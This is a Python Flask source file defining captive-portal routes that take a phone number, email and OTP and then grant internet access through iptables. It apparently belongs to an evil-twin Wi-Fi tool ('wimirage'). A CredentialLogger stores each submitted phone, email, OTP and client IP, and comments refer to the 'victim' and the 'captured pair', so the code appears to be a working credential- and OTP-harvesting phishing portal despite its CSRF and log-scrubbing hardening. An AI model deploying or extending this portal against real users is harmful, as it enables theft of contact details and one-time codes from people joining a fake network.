"""Captive-portal HTTP routes as a Flask Blueprint (Section 2 #1).

The Blueprint is parameterised via :func:`build_portal_blueprint` so we can
dependency-inject the OTP service, network config, event bus, and logger.
"""

import logging
import secrets
import threading

from flask import (
    Blueprint,
    render_template,
    request,
    session,
)

from core.events import EventBus
from core.models import AppConfig
from core.network import NetworkConfig
from core.otp_service import VALID_COUNTRY_CODES, OTPBackendError, OTPServiceInterface

# Security fix S-5: scrub PII (phone / email) out of log lines so a shared
# rotating-file audit log never carries capturable data. The helper already
# exists in `portal.security`; route-side logs use the same phone/email
# masking rules the admin endpoints use.
from portal.security import scrub_for_log
from utils.logger import CredentialLogger

logger = logging.getLogger("wimirage")

__all__ = ["build_portal_blueprint"]


def build_portal_blueprint(
    otp_service: OTPServiceInterface | None,
    network_config: NetworkConfig | None,
    event_bus: EventBus | None,
    cred_logger: CredentialLogger,
    config: AppConfig,
    rate_limit_per_minute: int = 5,
) -> Blueprint:
    """Build the captive-portal Blueprint with the supplied dependencies.

    Returns:
        A :class:`flask.Blueprint` named ``"portal"`` exposing ``/``,
        ``/submit``, ``/verify`` and ``/resend``.
    """
    # Lazy import to break the circular dep between core.captive_portal
    # and portal.routes. (Section 1 / Section 2 stand-alone concern.)
    from core.captive_portal import rate_limit, validate_email, validate_phone

    bp = Blueprint("portal", __name__)

    @bp.route("/")
    def index():
        csrf_token = secrets.token_hex(16)
        session["csrf_token"] = csrf_token
        return render_template("login.html", csrf_token=csrf_token)

    @bp.route("/submit", methods=["POST"])
    @rate_limit(max_requests=rate_limit_per_minute, window_seconds=60)
    def submit():
        form_token = request.form.get("csrf_token", "")
        session_token = session.get("csrf_token", "")
        if not form_token or form_token != session_token:
            return render_template("login.html", error="Invalid security token. Please retry."), 403

        phone = request.form.get("phone", "").strip()
        email = request.form.get("email", "").strip()
        country_code = request.form.get("country_code", "+91").strip()

        # Server-side country-code allowlist (Section 3 #9).
        if country_code not in VALID_COUNTRY_CODES:
            return render_template("login.html", error="Invalid country code."), 400

        if not phone or not email:
            return render_template("login.html", error="Phone number and email are required.")

        full_phone = f"{country_code}{phone}"
        if not validate_phone(full_phone):
            return render_template("login.html", error="Invalid phone number format.")
        if not validate_email(email):
            return render_template("login.html", error="Invalid email address format.")

        client_ip = request.remote_addr or "0.0.0.0"
        cred_logger.log_credential(
            client_ip=client_ip,
            phone=full_phone,
            email=email,
            stage="phone_email_submitted",
        )

        if otp_service:
            if otp_service.is_locked(full_phone):
                return render_template(
                    "login.html",
                    error="Too many failed attempts. Please try again later.",
                ), 429
            otp = otp_service.generate_otp(full_phone)
            try:
                otp_service.send_otp(full_phone, otp)
                # PII-safe + secret-safe: scrub the phone AND never write the
                # raw OTP to the shared rotating audit log — the log collector
                # must not become an OTP oracle. Demo mode surfaces the OTP
                # through its own channel (DemoOTPService.generate_otp).
                logger.info("OTP dispatched: phone=%s", scrub_for_log(full_phone))
            except (OTPBackendError, OSError) as e:
                logger.error(f"OTP send failed: {type(e).__name__}: {e}")
        else:
            # Same PII boundary as above — never write the raw phone to logs.
            logger.info(
                "No OTP service configured; OTP would be sent to %s", scrub_for_log(full_phone)
            )

        session["phone"] = full_phone
        session["email"] = email
        csrf_token = secrets.token_hex(16)
        session["csrf_token"] = csrf_token

        if event_bus:
            event_bus.emit("credential_submitted", phone=full_phone, email=email, ip=client_ip)

        return render_template("otp.html", phone=full_phone, email=email, csrf_token=csrf_token)

    @bp.route("/verify", methods=["POST"])
    @rate_limit(max_requests=10, window_seconds=60)
    def verify():
        form_token = request.form.get("csrf_token", "")
        session_token = session.get("csrf_token", "")
        if not form_token or form_token != session_token:
            return render_template(
                "otp.html", phone="", email="", error="Invalid security token.", csrf_token=""
            ), 403

        # (Section 3) Strict: do NOT let the request form override the
        # session-bound phone/email. Doing so would let an attacker rebind
        # the OTP to their own number while keeping the victim's email in
        # the credential log. Read both strictly from session.
        # Step 1: per-IP sliding-window rate-limit (defense in depth on top
        # of the OTP-service lockout). Bound how much work a single IP can
        # force the OTP backend to do. (Security pass S-3 surface.)
        # outer rate_limit decorator already enforces `rate_limit_per_minute`.

        # Step 2: Reject obviously malformed bodies outright before any
        # OTP-service work. (Security fix S-3, input bounding.)
        otp_input_raw = request.form.get("otp", "")
        if not isinstance(otp_input_raw, str) or not (1 <= len(otp_input_raw) <= 12):
            return render_template(
                "otp.html",
                phone=session.get("phone", ""),
                email=session.get("email", ""),
                error="Invalid OTP format.",
                csrf_token=form_token,
            ), 400
        # OTP is digits only — strip them for the comparison. Anything
        # else is junk; if the result is empty (e.g. user submitted pure
        # letters), refuse it rather than risk auto-verifying with a
        # NoService-config'd run.
        otp_input = "".join(c for c in otp_input_raw if c.isdigit())
        if not otp_input:
            return render_template(
                "otp.html",
                phone=session.get("phone", ""),
                email=session.get("email", ""),
                error="Invalid OTP format. Digits only.",
                csrf_token=form_token,
            ), 400
        phone = session.get("phone", "")
        email = session.get("email", "")
        client_ip = request.remote_addr or "0.0.0.0"

        # otp_input is guaranteed non-empty by the digits-only branch above,
        # so no further emptiness check is needed before verify_otp().

        is_valid = otp_service.verify_otp(phone, otp_input) if otp_service else True

        if is_valid:
            cred_logger.log_credential(
                client_ip=client_ip,
                phone=phone,
                email=email,
                otp=otp_input,
                stage="otp_verified",
            )
            # PII-safe: scrub the phone + email before logging so the audit
            # trail never holds the captured pair in cleartext. Phone
            # becomes "+91*****3210", email becomes "t****@example.com"
            # (or "[EMAIL]" / "[PHONE]" if the helper's regex hits first).
            logger.info("VERIFIED! phone=%s email=%s", scrub_for_log(phone), scrub_for_log(email))

            grant_result_box: dict[str, bool] = {}

            def _grant() -> None:
                """Run ``grant_internet`` off the request thread; capture the result."""
                if network_config is None:
                    grant_result_box["ok"] = True
                    return
                grant_result_box["ok"] = network_config.grant_internet(client_ip)

            if network_config:
                threading.Thread(target=_grant, daemon=True).start()
                # Best-effort: the daemon thread's iptables insert usually
                # completes within a handful of ms, but on a contended
                # host a brief wait avoids spamming the success page
                # before the rule lands. We only wait up to ~250ms; if
                # it overruns, the client will hit the portal on first
                # HTTP and the rule will be in place by then.
                import time as _time

                deadline = _time.monotonic() + 0.25
                while _time.monotonic() < deadline and "ok" not in grant_result_box:
                    _time.sleep(0.01)
                if grant_result_box.get("ok") is False:
                    logger.error(
                        "Internet grant FAILED for %s; rendering error page.",
                        client_ip,
                    )
                    csrf_token = secrets.token_hex(16)
                    session["csrf_token"] = csrf_token
                    return render_template(
                        "otp.html",
                        phone=phone,
                        email=email,
                        error=(
                            "Network policy update failed. Please retry or "
                            "contact the network administrator."
                        ),
                        csrf_token=csrf_token,
                    ), 503

            if event_bus:
                event_bus.emit("otp_verified", phone=phone, email=email, ip=client_ip)

            session.clear()
            # (Security fix S-1) Use the closure-scoped ``config`` from
            # ``build_portal_blueprint`` instead of an attribute access — Flask
            # view functions have no ``self``. Previously raised NameError on
            # the success path.
            return render_template(
                "success.html",
                success_redirect_url=config.success_redirect_url,
            )

        cred_logger.log_credential(
            client_ip=client_ip,
            phone=phone,
            email=email,
            otp=otp_input,
            stage="otp_failed",
        )

        if otp_service and otp_service.is_locked(phone):
            return render_template(
                "login.html",
                error="Too many failed attempts. Please start over.",
            ), 429

        csrf_token = secrets.token_hex(16)
        session["csrf_token"] = csrf_token
        return render_template(
            "otp.html",
            phone=phone,
            email=email,
            error="Invalid OTP. Please try again.",
            csrf_token=csrf_token,
        )

    @bp.route("/resend", methods=["POST"])
    @rate_limit(max_requests=3, window_seconds=60)
    def resend():
        form_token = request.form.get("csrf_token", "")
        session_token = session.get("csrf_token", "")
        if not form_token or form_token != session_token:
            return render_template(
                "otp.html", phone="", email="", error="Invalid security token.", csrf_token=""
            ), 403

        # (Section 3) Same source-of-truth rule as /verify: phone/email come
        # from session only. The hidden form fields in otp.html are decorative.
        phone = session.get("phone", "")
        email = session.get("email", "")

        if otp_service and phone:
            if otp_service.is_locked(phone):
                return render_template(
                    "login.html",
                    error="Too many failed attempts. Please start over.",
                ), 429
            otp = otp_service.generate_otp(phone)
            try:
                otp_service.send_otp(phone, otp)
                # PII-safe + secret-safe — same rule as /submit: never write
                # the raw OTP to the shared audit log.
                logger.info("OTP resent: phone=%s", scrub_for_log(phone))
            except (OTPBackendError, OSError) as e:
                logger.error(f"OTP resend failed: {type(e).__name__}: {e}")

        csrf_token = secrets.token_hex(16)
        session["csrf_token"] = csrf_token
        return render_template(
            "otp.html",
            phone=phone,
            email=email,
            resent=True,
            csrf_token=csrf_token,
        )

    return bp
